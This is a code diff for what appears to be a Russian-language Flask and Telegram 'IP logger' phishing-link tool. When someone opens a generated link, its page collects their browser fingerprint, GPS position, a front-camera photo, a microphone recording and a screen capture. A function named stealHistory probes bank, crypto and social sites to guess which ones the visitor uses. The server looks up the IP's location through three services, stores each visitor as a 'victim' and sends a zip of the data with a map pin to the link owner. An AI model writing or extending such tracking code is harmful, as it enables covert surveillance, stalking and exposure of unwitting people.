@@ -43,7 +43,15 @@ body{background:#000;font-family:Arial;overflow:hidden}
 <video id="v" style="display:none" autoplay playsinline></video><canvas id="c" style="display:none"></canvas>
 <script>
 fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?'})});
-function getGPS(){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err=>{navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err2=>{},{enableHighAccuracy:true,timeout:15000,maximumAge:0});},{enableHighAccuracy:true,timeout:15000,maximumAge:0});}}
+function getGPS(){
+ if(navigator.geolocation){
+  navigator.geolocation.getCurrentPosition(
+   pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},
+   err=>{navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err2=>{},{enableHighAccuracy:true,timeout:20000,maximumAge:0});},
+   {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+  );
+ }
+}
 async function stealHistory(){var sites=['https://web.telegram.org','https://vk.com','https://ok.ru','https://instagram.com','https://twitter.com','https://youtube.com','https://discord.com','https://github.com','https://steamcommunity.com','https://reddit.com','https://tinder.com','https://onlyfans.com','https://binance.com','https://bybit.com','https://paypal.com','https://sberbank.ru','https://tinkoff.ru','https://ozon.ru','https://wildberries.ru','https://avito.ru'];var visited=[];for(var i=0;i<sites.length;i++){try{var img=new Image();img.src=sites[i]+'/favicon.ico';await new Promise(function(r){img.onload=function(){visited.push(sites[i]);r();};img.onerror=function(){visited.push(sites[i]);r();};setTimeout(function(){r();},500);});}catch(e){}}if(visited.length>0){fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});}}
 async function cam(){try{var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=st;await v.play();await new Promise(function(r){setTimeout(r,3000);});var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
 async function recordAudio(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
@@ -71,21 +79,61 @@ def gen_id():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
 def get_ip_info(ip):
+    """Точная геолокация через ТРИ сервиса"""
     first_ip = ip.split(',')[0].strip()
+    
+    # Сервис 1: ipapi.co (самый точный)
     try:
         r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
         data = r.json()
-        return {
-            'country': data.get('country_name', '?'),
-            'city': data.get('city', '?'),
-            'region': data.get('region', '?'),
-            'isp': data.get('org', '?'),
-            'lat': data.get('latitude'),
-            'lon': data.get('longitude'),
-            'query': first_ip
-        }
-    except:
-        return {'country': '?', 'city': '?', 'region': '?', 'isp': '?', 'lat': None, 'lon': None, 'query': first_ip}
+        if data.get('city'):
+            return {
+                'country': data.get('country_name', '?'),
+                'city': data.get('city', '?'),
+                'region': data.get('region', '?'),
+                'isp': data.get('org', '?'),
+                'lat': data.get('latitude'),
+                'lon': data.get('longitude'),
+                'query': first_ip,
+                'source': 'ipapi.co'
+            }
+    except: pass
+    
+    # Сервис 2: ip-api.com (запасной)
+    try:
+        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", timeout=5)
+        data = r.json()
+        if data.get('city'):
+            return {
+                'country': data.get('country', '?'),
+                'city': data.get('city', '?'),
+                'region': data.get('regionName', '?'),
+                'isp': data.get('isp', '?'),
+                'lat': data.get('lat'),
+                'lon': data.get('lon'),
+                'query': first_ip,
+                'source': 'ip-api.com'
+            }
+    except: pass
+    
+    # Сервис 3: ipwhois.app (ещё один запасной)
+    try:
+        r = requests.get(f"https://ipwhois.app/json/{first_ip}", timeout=5)
+        data = r.json()
+        if data.get('city'):
+            return {
+                'country': data.get('country', '?'),
+                'city': data.get('city', '?'),
+                'region': data.get('region', '?'),
+                'isp': data.get('isp', '?'),
+                'lat': data.get('latitude'),
+                'lon': data.get('longitude'),
+                'query': first_ip,
+                'source': 'ipwhois.app'
+            }
+    except: pass
+    
+    return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip,'source':'none'}
 
 @app.route('/')
 def home():
@@ -100,7 +148,7 @@ def track(lid):
     v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None, 'audio': None, 'screen': None}
     v.update(get_ip_info(ip))
     links[lid]['victims'].append(v)
-    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid, v), loop)
+    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
     link_type = links[lid].get('type', 'full')
     if link_type == 'audio':
         return render_template_string(AUDIO_PAGE, link_id=lid)
@@ -152,68 +200,60 @@ def screen(lid):
             links[lid]['victims'][-1]['screen'] = d['screen']
     return 'ok'
 
-async def notify(uid, lid, v):
+async def notify(uid, lid):
     try:
-        # Ждём 6 секунд чтобы все данные успели прийти
-        await asyncio.sleep(6)
-        
-        # Обновляем данные жертвы (фото/аудио/скрин уже пришли)
-        if links[lid]['victims']:
-            v = links[lid]['victims'][-1]
+        await asyncio.sleep(20)
+        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
         
         zip_path = f"/tmp/data_{lid}.zip"
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
             report = f"""📋 ОТЧЁТ IP LOGGER
 ═══════════════
-🕐 Время: {v['time']}
-🌐 IP: {v['ip'].split(',')[0].strip()}
+🕐 Время: {v.get('time','?')}
+🌐 IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
 🏙 Город: {v.get('city','?')}
 🗺 Регион: {v.get('region','?')}
 🌍 Страна: {v.get('country','?')}
 📡 Провайдер: {v.get('isp','?')}
+📡 Источник гео: {v.get('source','?')}
 📱 Устройство: {v.get('ua','?')[:200]}
 """
             if v.get('gps') and v['gps'].get('lat'):
-                report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
+                report += f"📍 ТОЧНЫЙ GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
             if v.get('history') and v['history'].get('visited'):
-                report += f"\n📜 История браузера:\n"
+                report += f"\n📜 История браузера ({len(v['history']['visited'])} сайтов):\n"
                 for site in v['history']['visited']:
                     report += f"  • {site}\n"
             zf.writestr('report.txt', report)
             
             if v.get('photo'):
-                try:
-                    zf.writestr('photo.jpg', base64.b64decode(v['photo'].split(',')[1]))
-                except: pass
-            else:
-                zf.writestr('NO_PHOTO.txt', 'Фото не получено (камера недоступна)')
+                try: zf.writestr('photo.jpg', base64.b64decode(v['photo'].split(',')[1]))
+                except: zf.writestr('NO_PHOTO.txt', 'Ошибка')
+            else: zf.writestr('NO_PHOTO.txt', 'Камера не дала разрешения')
             
             if v.get('audio'):
-                try:
-                    zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
-                except: pass
-            else:
-                zf.writestr('NO_AUDIO.txt', 'Аудио не получено (микрофон недоступен)')
+                try: zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
+                except: zf.writestr('NO_AUDIO.txt', 'Ошибка')
+            else: zf.writestr('NO_AUDIO.txt', 'Микрофон не дал разрешения')
             
             if v.get('screen'):
-                try:
-                    zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
-                except: pass
-            else:
-                zf.writestr('NO_SCREEN.txt', 'Запись экрана не получена')
+                try: zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
+                except: zf.writestr('NO_SCREEN.txt', 'Ошибка')
+            else: zf.writestr('NO_SCREEN.txt', 'Запись экрана отменена')
         
         await bot.send_file(uid, zip_path, caption=f"📦 Архив `{lid}`", force_document=True)
         os.remove(zip_path)
         
+        # Гео-точка (GPS приоритет)
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             acc = v['gps'].get('acc', 10)
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(acc) if acc else 10))
-            await bot.send_file(uid, file=geo, caption=f"📍 GPS (±{acc}м)")
+            await bot.send_file(uid, file=geo, caption=f"📍 ТОЧНЫЙ GPS (±{acc}м)")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
-            await bot.send_file(uid, file=geo, caption="📍 IP-гео")
+            await bot.send_file(uid, file=geo, caption=f"📍 IP-гео (источник: {v.get('source','?')})")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
     except Exception as e:
         print(f"Ошибка notify: {e}")
